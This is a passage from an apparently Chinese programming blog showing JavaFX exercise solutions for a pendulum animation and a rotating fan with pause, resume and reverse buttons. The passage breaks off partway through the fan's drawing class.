<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>application<span class="token punctuation">.</span></span><span class="token class-name">Application</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Scene</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">Pane</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>paint<span class="token punctuation">.</span></span><span class="token class-name">Color</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>shape<span class="token punctuation">.</span></span><span class="token class-name">Arc</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>shape<span class="token punctuation">.</span></span><span class="token class-name">ArcType</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>shape<span class="token punctuation">.</span></span><span class="token class-name">Circle</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>stage<span class="token punctuation">.</span></span><span class="token class-name">Stage</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Duration</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PendulumAnimation</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span> <span class="token punctuation">{</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> primaryStage<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 创建一个 Pane</span>
        <span class="token class-name">Pane</span> pane <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Pane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建一个圆形作为钟摆的重物</span>
        <span class="token class-name">Circle</span> circle <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Circle</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">AQUA</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        circle<span class="token punctuation">.</span><span class="token function">setCenterX</span><span class="token punctuation">(</span><span class="token number">250</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        circle<span class="token punctuation">.</span><span class="token function">setCenterY</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建一个弧形作为钟摆的轨迹</span>
        <span class="token class-name">Arc</span> arc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Arc</span><span class="token punctuation">(</span><span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">225</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        arc<span class="token punctuation">.</span><span class="token function">setFill</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        arc<span class="token punctuation">.</span><span class="token function">setStroke</span><span class="token punctuation">(</span><span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">BLACK</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        arc<span class="token punctuation">.</span><span class="token function">setStrokeWidth</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        arc<span class="token punctuation">.</span><span class="token function">setType</span><span class="token punctuation">(</span><span class="token class-name">ArcType</span><span class="token punctuation">.</span><span class="token constant">OPEN</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 将弧形和圆形添加到 Pane 中</span>
        pane<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>arc<span class="token punctuation">,</span> circle<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建摆动动画</span>
        <span class="token class-name">PathTransition</span> pathTransition <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PathTransition</span><span class="token punctuation">(</span><span class="token class-name">Duration</span><span class="token punctuation">.</span><span class="token function">seconds</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> arc<span class="token punctuation">,</span> circle<span class="token punctuation">)</span><span class="token punctuation">;</span>
        pathTransition<span class="token punctuation">.</span><span class="token function">setInterpolator</span><span class="token punctuation">(</span><span class="token class-name">Interpolator</span><span class="token punctuation">.</span><span class="token constant">LINEAR</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        pathTransition<span class="token punctuation">.</span><span class="token function">setCycleCount</span><span class="token punctuation">(</span><span class="token class-name">Timeline</span><span class="token punctuation">.</span><span class="token constant">INDEFINITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        pathTransition<span class="token punctuation">.</span><span class="token function">setAutoReverse</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建透明度变化动画</span>
        <span class="token class-name">FadeTransition</span> fadeTransition <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FadeTransition</span><span class="token punctuation">(</span><span class="token class-name">Duration</span><span class="token punctuation">.</span><span class="token function">seconds</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> circle<span class="token punctuation">)</span><span class="token punctuation">;</span>
        fadeTransition<span class="token punctuation">.</span><span class="token function">setFromValue</span><span class="token punctuation">(</span><span class="token number">1.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        fadeTransition<span class="token punctuation">.</span><span class="token function">setToValue</span><span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        fadeTransition<span class="token punctuation">.</span><span class="token function">setAutoReverse</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        fadeTransition<span class="token punctuation">.</span><span class="token function">setCycleCount</span><span class="token punctuation">(</span><span class="token class-name">Timeline</span><span class="token punctuation">.</span><span class="token constant">INDEFINITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 启动动画</span>
        pathTransition<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        fadeTransition<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 设置鼠标点击事件</span>
        pane<span class="token punctuation">.</span><span class="token function">setOnMouseClicked</span><span class="token punctuation">(</span>event <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>pathTransition<span class="token punctuation">.</span><span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token class-name">PathTransition<span class="token punctuation">.</span>Status</span><span class="token punctuation">.</span><span class="token constant">RUNNING</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                pathTransition<span class="token punctuation">.</span><span class="token function">pause</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                fadeTransition<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                pathTransition<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                fadeTransition<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建一个 Scene</span>
        <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span>pane<span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 设置 Stage 的 Scene</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 显示 Stage</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setTitle</span><span class="token punctuation">(</span><span class="token string">"Pendulum Animation"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<img src="/images/posts/piKWftU.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/11/02/piKWftU.png'">
<h2 id="编写一个程序显示一个转动的风扇-pause-resume和reverse-按钮用于暂停-继续和反转风扇的转动"><a class="markdownIt-Anchor" href="#编写一个程序显示一个转动的风扇-pause-resume和reverse-按钮用于暂停-继续和反转风扇的转动"></a> 编写一个程序显示一个转动的风扇。Pause、Resume和Reverse 按钮用于暂停、继续和反转风扇的转动</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>animation<span class="token punctuation">.</span></span><span class="token class-name">KeyFrame</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>animation<span class="token punctuation">.</span></span><span class="token class-name">Timeline</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>application<span class="token punctuation">.</span></span><span class="token class-name">Application</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>geometry<span class="token punctuation">.</span></span><span class="token class-name">Pos</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Scene</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>control<span class="token punctuation">.</span></span><span class="token class-name">Button</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">BorderPane</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">HBox</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">Pane</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>paint<span class="token punctuation">.</span></span><span class="token class-name">Color</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>shape<span class="token punctuation">.</span></span><span class="token class-name">Arc</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>shape<span class="token punctuation">.</span></span><span class="token class-name">ArcType</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>shape<span class="token punctuation">.</span></span><span class="token class-name">Circle</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>stage<span class="token punctuation">.</span></span><span class="token class-name">Stage</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Duration</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RunningFan</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span> <span class="token punctuation">{</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> primaryStage<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">FanPane</span> fanPane <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FanPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">HBox</span> hBox <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HBox</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Button</span> button_Pause <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"暂停"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Button</span> button_Resume <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"继续"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Button</span> button_Reverse <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"反转"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hBox<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span><span class="token class-name">Pos</span><span class="token punctuation">.</span><span class="token constant">CENTER</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hBox<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>button_Pause<span class="token punctuation">,</span> button_Resume<span class="token punctuation">,</span> button_Reverse<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">BorderPane</span> borderPane <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BorderPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        borderPane<span class="token punctuation">.</span><span class="token function">setCenter</span><span class="token punctuation">(</span>fanPane<span class="token punctuation">)</span><span class="token punctuation">;</span>
        borderPane<span class="token punctuation">.</span><span class="token function">setBottom</span><span class="token punctuation">(</span>hBox<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span>borderPane<span class="token punctuation">,</span> <span class="token number">320</span><span class="token punctuation">,</span> <span class="token number">320</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setTitle</span><span class="token punctuation">(</span><span class="token string">"Running Fan"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> framerate <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>
        <span class="token class-name">Timeline</span> timeline <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Timeline</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">KeyFrame</span><span class="token punctuation">(</span><span class="token class-name">Duration</span><span class="token punctuation">.</span><span class="token function">millis</span><span class="token punctuation">(</span><span class="token number">1000</span> <span class="token operator">/</span> framerate<span class="token punctuation">)</span><span class="token punctuation">,</span> e <span class="token operator">-&gt;</span> fanPane<span class="token punctuation">.</span><span class="token function">move</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        timeline<span class="token punctuation">.</span><span class="token function">setCycleCount</span><span class="token punctuation">(</span><span class="token class-name">Timeline</span><span class="token punctuation">.</span><span class="token constant">INDEFINITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        timeline<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        scene<span class="token punctuation">.</span><span class="token function">widthProperty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addListener</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> fanPane<span class="token punctuation">.</span><span class="token function">setW</span><span class="token punctuation">(</span>fanPane<span class="token punctuation">.</span><span class="token function">getWidth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        scene<span class="token punctuation">.</span><span class="token function">heightProperty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addListener</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> fanPane<span class="token punctuation">.</span><span class="token function">setH</span><span class="token punctuation">(</span>fanPane<span class="token punctuation">.</span><span class="token function">getHeight</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        button_Pause<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> timeline<span class="token punctuation">.</span><span class="token function">pause</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        button_Resume<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> timeline<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        button_Reverse<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> fanPane<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">FanPane</span> <span class="token keyword">extends</span> <span class="token class-name">Pane</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">double</span> width <span class="token operator">=</span> <span class="token number">320</span><span class="token punctuation">;</span>  <span class="token comment">// 设置初始宽度值</span>
    <span class="token keyword">private</span> <span class="token keyword">double</span> high <span class="token operator">=</span> <span class="token number">320</span><span class="token punctuation">;</span>  <span class="token comment">// 设置初始高度值</span>
    <span class="token keyword">private</span> <span class="token keyword">double</span> radius <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>width<span class="token punctuation">,</span> high<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0.5</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">double</span> increment <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">Arc</span> arc<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Arc</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">double</span> startAngle <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">Circle</span> circle <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Circle</span><span class="token punctuation">(</span>width <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">,</span> high <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">,</span> radius<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">public</span> <span class="token class-name">FanPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        circle<span class="token punctuation">.</span><span class="token function">setStroke</span><span class="token punctuation">(</span><span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">BLACK</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        circle<span class="token punctuation">.</span><span class="token function">setFill</span><span class="token punctuation">(</span><span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">WHITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>circle<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            arc<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Arc</span><span class="token punctuation">(</span>width <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">,</span> high <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">,</span> radius <span class="token operator">*</span> <span class="token number">0.9</span><span class="token punctuation">,</span> radius <span class="token operator">*</span> <span class="token number">0.9</span><span class="token punctuation">,</span> startAngle <span class="token operator">+</span> i <span class="token operator">*</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            arc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">setFill</span><span class="token punctuation">(</span><span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">BLACK</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            arc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">setType</span><span class="token punctuation">(</span><span class="token class-name">ArcType</span><span class="token punctuation">.</span><span class="token constant">ROUND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>arc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        increment <span class="token operator">*=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">move</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">setStartAngle</span><span class="token punctuation">(</span>startAngle <span class="token operator">+</span> increment<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setStartAngle</span><span class="token punctuation">(</span><span class="token keyword">double</span> angle<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        startAngle <span class="token operator">=</span> angle<span class="token punctuation">;</span>
        <span class="token function">setValues</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setValues</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        radius <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>width<span class="token punctuation">,</span> high<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0.5</span><span class="token punctuation">;</span>
        circle<span class="token punctuation">.</span><span class="token function">setRadius</span><span class="token punctuation">(</span>radius<span class="token punctuation">)</span><span class="token punctuation">;</span>
        circle<span class="token punctuation">.</span><span class="token function">setCenterX</span><span class="token punctuation">(</span>width <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        circle<span class="token punctuation">.</span><span class="token function">setCenterY</span><span class="token punctuation">(</span>high <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            arc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">setRadiusX</span><span class="token punctuation">(</span>radius <span class="token operator">*</span> <span class="token number">0.9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            arc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">setRadiusY</span><span class="token punctuation">(</span>radius <span class="token operator">*</span> <span class="token number">0.9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            arc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">setCenterX</span><span class="token punctuation">(</span>width <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            arc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">setCenterY</span><span class="token punctuation">(</span>high <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            arc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">setStartAngle</span><span class="token punctuation">(</span>startAngle <span class="token operator">+</span> i <span class="token operator">*</span> <span class="token number">90</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setW</span><span class="token punctuation">(</span><span class="token keyword">double</span> w<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>width <span class="token operator">=</span> w<span class="token punctuation">;</span>
        radius <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>width<span class="token punctuation">,</span> high<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0.5</span><span class="token punctuation">;</span>
        <span class="token function">setValues</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setH</span><span class="token punctuation">(</span><span class="token keyword">double</span> h<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>high <span class="token operator">=</span> h<span class="token punctuation">;</span>
        radius <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>width<span class="token punctuation">,</span> high<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0.5</span><span class="token punctuation">;</span>
